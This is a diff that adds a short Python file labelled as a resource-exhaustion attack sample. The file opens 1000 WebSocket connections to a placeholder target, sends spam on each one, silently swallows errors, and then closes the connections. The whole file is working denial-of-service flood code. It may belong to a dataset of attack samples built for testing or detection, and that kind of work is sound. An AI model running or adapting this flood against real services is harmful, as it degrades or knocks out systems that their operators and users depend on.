@@ -1,0 +1,23 @@
+# Resource Exhaustion - Concurrent Attack Sample 9
+# Created: 2026-03-30T22:24:11.730540
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# WebSocket Connection Flood - Sample 3
+import asyncio
+import websockets
+
+async def ws_flood():
+    uri = "ws://target.com/socket"
+    connections = []
+    for i in range(1000):
+        try:
+            ws = await websockets.connect(uri)
+            connections.append(ws)
+            await ws.send(f"spam_{i}")
+        except:
+            pass
+    
+    for ws in connections:
+        await ws.close()
+
+asyncio.run(ws_flood())
